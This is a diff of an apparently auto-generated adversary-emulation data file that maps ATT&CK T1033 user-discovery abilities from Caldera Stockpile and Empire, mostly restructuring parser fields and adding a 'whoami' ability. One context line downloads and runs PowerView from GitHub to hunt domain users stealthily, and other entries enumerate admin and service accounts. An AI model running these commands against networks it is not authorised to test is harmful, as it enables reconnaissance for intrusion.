@@ -47,9 +47,10 @@ who
 
 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-UserHunter -Stealth -Verbose
 
-{'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.user.name', 'json_key': 'samaccountname', 'json_type': ['str']}]}, 'payloads': ['powerview.ps1']}}}
+{'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.user.name', 'custom_parser_vals': {'json_key': 'samaccountname', 'json_type': 'str'}}]}, 'payloads': ['powerview.ps1']}}}
+{'darwin': {'sh': {'command': 'whoami\n'}}, 'linux': {'sh': {'command': 'whoami\n'}}, 'windows': {'psh': {'command': 'whoami\n'}}}
 {'darwin': {'sh': {'command': 'whoami', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}}, 'linux': {'sh': {'command': 'whoami', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}}, 'windows': {'psh': {'command': '$env:username\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}, 'cmd': {'command': 'echo %username%', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}}}
-{'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.user.name', 'json_key': 'samaccountname', 'json_type': ['str']}]}, 'payloads': ['powerview.ps1']}}}
+{'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.user.name', 'custom_parser_vals': {'json_key': 'samaccountname', 'json_type': 'str'}}]}, 'payloads': ['powerview.ps1']}}}
 powershell/situational_awareness/network/bloodhound
 powershell/situational_awareness/network/bloodhound
 powershell/situational_awareness/network/powerview/get_session
@@ -94,12 +95,17 @@ powershell/situational_awareness/network/powerview/get_session
                                              '-Force;\n'
                                              'Get-NetUser -AdminCount | '
                                              'ConvertTo-Json -Depth 1\n',
-                                  'parsers': {'plugins.stockpile.app.parsers.json': [{'json_key': 'samaccountname',
-                                                                                      'json_type': ['str'],
+                                  'parsers': {'plugins.stockpile.app.parsers.json': [{'custom_parser_vals': {'json_key': 'samaccountname',
+                                                                                                             'json_type': 'str'},
                                                                                       'source': 'domain.user.name'}]},
                                   'payloads': ['powerview.ps1']}}},
   'name': 'Get Administrator users for a computer',
   'source': 'data/abilities/discovery/aaf34d82-aea9-4278-8ec4-789653e4f5d9.yml'},
+ {'command': {'darwin': {'sh': {'command': 'whoami\n'}},
+              'linux': {'sh': {'command': 'whoami\n'}},
+              'windows': {'psh': {'command': 'whoami\n'}}},
+  'name': 'Obtain user from current session',
+  'source': 'data/abilities/discovery/bd527b63-9f9e-46e0-9816-b8434d2b8989.yml'},
  {'command': {'darwin': {'sh': {'command': 'whoami',
                                 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
                                                                                     {'source': 'domain.user.name'}]}}},
@@ -118,8 +124,8 @@ powershell/situational_awareness/network/powerview/get_session
                                              '-Force;\n'
                                              'Get-NetUser -SPN | '
                                              'ConvertTo-Json -Depth 1\n',
-                                  'parsers': {'plugins.stockpile.app.parsers.json': [{'json_key': 'samaccountname',
-                                                                                      'json_type': ['str'],
+                                  'parsers': {'plugins.stockpile.app.parsers.json': [{'custom_parser_vals': {'json_key': 'samaccountname',
+                                                                                                             'json_type': 'str'},
                                                                                       'source': 'domain.user.name'}]},
                                   'payloads': ['powerview.ps1']}}},
   'name': 'Get Service Accounts for a domain',
@@ -440,8 +446,8 @@ powershell/situational_awareness/network/powerview/get_session
                                                                                                             'ConvertTo-Json '
                                                                                                             '-Depth '
                                                                                                             '1\n',
-                                                                                                 'parsers': {'plugins.stockpile.app.parsers.json': [{'json_key': 'samaccountname',
-                                                                                                                                                     'json_type': ['str'],
+                                                                                                 'parsers': {'plugins.stockpile.app.parsers.json': [{'custom_parser_vals': {'json_key': 'samaccountname',
+                                                                                                                                                                            'json_type': 'str'},
                                                                                                                                                      'source': 'domain.user.name'}]},
                                                                                                  'payloads': ['powerview.ps1']}}},
                                                                'tactic': 'discovery',
@@ -449,6 +455,21 @@ powershell/situational_awareness/network/powerview/get_session
                                                                              'name': 'System '
                                                                                      'Owner/User '
                                                                                      'Discovery'}}},
+ {'Mitre Stockpile - Obtain user from current session': {'description': 'Obtain '
+                                                                        'user '
+                                                                        'from '
+                                                                        'current '
+                                                                        'session',
+                                                         'id': 'bd527b63-9f9e-46e0-9816-b8434d2b8989',
+                                                         'name': 'Current User',
+                                                         'platforms': {'darwin': {'sh': {'command': 'whoami\n'}},
+                                                                       'linux': {'sh': {'command': 'whoami\n'}},
+                                                                       'windows': {'psh': {'command': 'whoami\n'}}},
+                                                         'tactic': 'discovery',
+                                                         'technique': {'attack_id': 'T1033',
+                                                                       'name': 'System '
+                                                                               'Owner/User '
+                                                                               'Discovery'}}},
  {'Mitre Stockpile - Find user running agent': {'description': 'Find user '
                                                                'running agent',
                                                 'id': 'c0da588f-79f0-4263-8998-7496b1a40596',
@@ -488,8 +509,8 @@ powershell/situational_awareness/network/powerview/get_session
                                                                                                        'ConvertTo-Json '
                                                                                                        '-Depth '
                                                                                                        '1\n',
-                                                                                            'parsers': {'plugins.stockpile.app.parsers.json': [{'json_key': 'samaccountname',
-                                                                                                                                                'json_type': ['str'],
+                                                                                            'parsers': {'plugins.stockpile.app.parsers.json': [{'custom_parser_vals': {'json_key': 'samaccountname',
+                                                                                                                                                                       'json_type': 'str'},
                                                                                                                                                 'source': 'domain.user.name'}]},
                                                                                             'payloads': ['powerview.ps1']}}},
                                                           'tactic': 'discovery',
